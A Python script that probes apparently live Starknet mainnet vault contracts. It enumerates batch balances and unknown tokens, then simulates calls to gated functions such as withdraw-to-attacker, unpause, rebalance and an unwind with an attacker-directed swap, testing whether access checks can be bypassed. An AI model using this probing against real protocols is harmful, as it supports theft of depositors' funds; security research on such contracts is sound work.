#!/usr/bin/env python3
"""Final gate probes + batch enumeration + unknown contract identification."""
import json

from rpc import felt, rpc, selector, call

from simulate_extended import (
    AC_STRK, AC_USDC, S_STRK, S_USDC, S_ETH, S_ETH_XL,
    ATTACKER, AC_OWNER, STRK, USDC, ETH, enc_swap, simulate, u256,
)
from simulate_extended import get_random_sender

CARTRIDGE = "https://api.cartridge.gg/x/starknet/mainnet"


def norm_sel(s):
    return "0x" + format(int(s, 16), "064x") if s else ""


def analyze2(sim):
    trace = sim.get("transaction_trace", {})
    ex = trace.get("execute_invocation", {})
    if ex.get("revert_reason"):
        return {"status": "REVERTED", "revert": str(ex["revert_reason"])[:1500]}
    lines = []

    def walk(node, d=0):
        if not isinstance(node, dict):
            return
        lines.append({"depth": d, "selector": norm_sel(node.get("entry_point_selector", "")),
                      "contract": node.get("contract_address", ""), "calldata": node.get("calldata", [])})
        for c in node.get("calls", []) or []:
            walk(c, d + 1)

    walk(ex)
    trf = [l for l in lines if l["selector"] == norm_sel(selector("transfer"))]
    return {"status": "SUCCESS", "n_calls": len(lines), "transfers": trf, "calls": lines[:30]}


def main():
    results = {}
    # 1. batch enumeration
    batches = {}
    for name, addr in [("AC_STRK", AC_STRK), ("AC_USDC", AC_USDC), ("S_STRK", S_STRK), ("S_USDC", S_USDC), ("S_ETH", S_ETH), ("S_ETH_XL", S_ETH_XL)]:
        row = {}
        for b in range(0, 4):
            try:
                row[b] = call(addr, selector("get_zklend_amount"), [hex(b), "0x0"])
            except Exception as e:  # noqa: BLE001
                row[b] = str(e)[:100]
        batches[name] = row
    results["batches"] = batches
    # 2. unknown contracts symbols/decimals
    unknown = {
        "0x63d69ae657bd2f40337c39bf35a870ac27ddf91e6623c2f52529db4c1619a51": "u1",
        "0x57146f6409deb4c9fa12866915dd952aa07c1eb2752e451d7f3b042086bdeb8": "zETH_XL_again",
        "0x1258eae3eae5002125bebf062d611a772e8aea3a36279a1b1a9f563074b4a134": "u2",
        "0x4c0a5193d58f74fbace4b74dcf65481e734ed1714121bdc571da345540efa05": "oracle_like",
        "0x6d8fa671ef84f791b7f601fa79fea8f6ceb70b5fa84189e3159d532162efc21": "zSTRK",
        "0x47ad51726d891f972e74e4ad858a261b43869f7126ce7436ee0b2529a98f486": "zUSDC",
    }
    meta = {}
    for a, n in unknown.items():
        row = {}
        for fn in ["symbol", "decimals", "name"]:
            try:
                row[fn] = call(a, selector(fn))
            except Exception as e:  # noqa: BLE001
                row[fn] = "ERR"
        meta[n] = {"address": a, **row}
    results["unknown_contracts"] = meta
    # 3. fresh nonce probes for the reverted gates
    sender = get_random_sender()
    results["random_sender"] = sender
    swap = enc_swap(STRK, 10**18, USDC, 0, 0, ATTACKER, 0, "0x0", [])
    probes = [
        ("S_USDC withdraw(1,attacker,0)", S_USDC, "withdraw", [hex(1), hex(0), felt(ATTACKER), hex(0)]),
        ("S_USDC rebalance(1,false)", S_USDC, "rebalance", [hex(1), hex(0), hex(0)]),
        ("S_USDC unpause()", S_USDC, "unpause", []),
        ("S_USDC locked(0,[])", S_USDC, "locked", [hex(0), hex(0)]),
        ("S_USDC unwind_dapp2(10000,attacker-swap)", S_USDC, "unwind_dapp2", [*u256(10000), *swap]),
        ("S_STRK withdraw(1,attacker,0)", S_STRK, "withdraw", [hex(1), hex(0), felt(ATTACKER), hex(0)]),
        ("AC_STRK harvest(dummy)", AC_STRK, "harvest", [hex(0), felt(AC_STRK), hex(0), hex(0), *swap]),
    ]
    for label, vault, entry, args in probes:
        try:
            r = simulate(sender, [(vault, entry, args)])
            results[label] = analyze2(r[0])
        except Exception as e:  # noqa: BLE001
            results[label] = {"status": "SIM_ERROR", "error": str(e)[:300]}
    # 4. holder withdraw_nostra (AC_owner has a Sensei position)
    try:
        r = simulate(AC_OWNER, [(S_USDC, "withdraw_nostra", [felt(AC_OWNER)])])
        results["S_USDC withdraw_nostra from AC_owner"] = analyze2(r[0])
    except Exception as e:  # noqa: BLE001
        results["S_USDC withdraw_nostra from AC_owner"] = {"status": "SIM_ERROR", "error": str(e)[:300]}
    print(json.dumps(results, indent=1))


if __name__ == "__main__":
    main()
